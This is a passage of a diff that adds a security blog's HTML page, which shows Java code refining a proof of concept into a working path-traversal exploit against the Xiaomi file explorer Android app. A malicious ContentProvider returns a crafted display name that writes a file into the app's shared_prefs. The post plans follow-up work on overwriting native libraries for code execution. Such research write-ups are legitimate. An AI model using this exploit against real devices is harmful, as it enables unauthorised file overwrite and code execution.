+</span></span><span style="display:flex;"><span>            Log.<span style="color:#a6e22e">e</span>(TAG, <span style="color:#e6db74">&#34;Error copying file to internal storage&#34;</span>, e); <span style="color:#75715e">// Log any exceptions</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>&lt;GIF PLACEHOLDER&gt;</p>
+<h3 id="step-4-modification-of-the-poc">Step 4: Modification of the PoC</h3>
+<p>There was one crucial detail that I skipped over, which is that the this portion of the code overrides the insert method of a ContentProvider to do nothing and return null, indicating that the provider wasn&rsquo;t even sending any data, and therefore not sending our directory traversal payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> Uri <span style="color:#a6e22e">insert</span>(Uri uri, ContentValues values) {
+</span></span><span style="display:flex;"><span>        Log.<span style="color:#a6e22e">d</span>(TAG, <span style="color:#e6db74">&#34;insert called (not implemented)&#34;</span>); <span style="color:#75715e">// Log unimplemented methods</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>This was modified like so:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> Cursor <span style="color:#a6e22e">query</span>(Uri uri, String<span style="color:#f92672">[]</span> projection, String selection,
+</span></span><span style="display:flex;"><span>                        String<span style="color:#f92672">[]</span> selectionArgs, String sortOrder) {
+</span></span><span style="display:flex;"><span>        SQLiteDatabase db <span style="color:#f92672">=</span> dbHelper.<span style="color:#a6e22e">getReadableDatabase</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Return the malicious path from the row you inserted</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> db.<span style="color:#a6e22e">rawQuery</span>(
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;SELECT display_name AS _display_name, _data, size AS _size FROM exploitTable LIMIT 1&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>Once the <code>query</code> method was fixed to return the malicious file path through the <code>_display_name</code> column, the exploit successfully wrote <code>pwned.txt</code> to the target directory (<code>/data/data/com.mi.android.globalFileexplorer/shared_prefs/</code>).</p>
+<p>&lt;GIF PLACEHOLDER&gt;</p>
+<h3 id="step-5-conclusion-and-next-steps">Step 5: Conclusion and Next Steps</h3>
+<p>This post has detailed a small journey from exploring a defanged PoC to refining it into a working exploit. The objective is not only to understand the vulnerability but also to inform developers and security professionals on how to better safeguard their applications.</p>
+<p>In future posts, we will:</p>
+<ol>
+<li><strong>Target More Sensitive Files:</strong> Explore methods to overwrite shared libraries or configuration files.</li>
+<li><strong>Achieve Code Execution:</strong> Delve into how overwriting an <code>.so</code> file can be leveraged for arbitrary code execution.</li>
+<li><strong>Broader Security Implications:</strong> Discuss additional mitigation strategies and best practices for securing Android applications.</li>
+</ol>
+<p>Stay tuned!</p>
+
+    </div>
+</div>
+
+            </main>
+        </div>
+
+
+        <footer class="footer">
+    
+        <span>
+            © 2025 gelosecurity, Built with
+            <a href="https://gohugo.io" class="footerLink">Hugo</a> and
+            <a href="https://github.com/LordMathis/hugo-theme-nightfall" class="footerLink">Nightfall</a> theme
+        </span>
+    
+</footer>
+    </div>
+
+</body>
+
+</html>
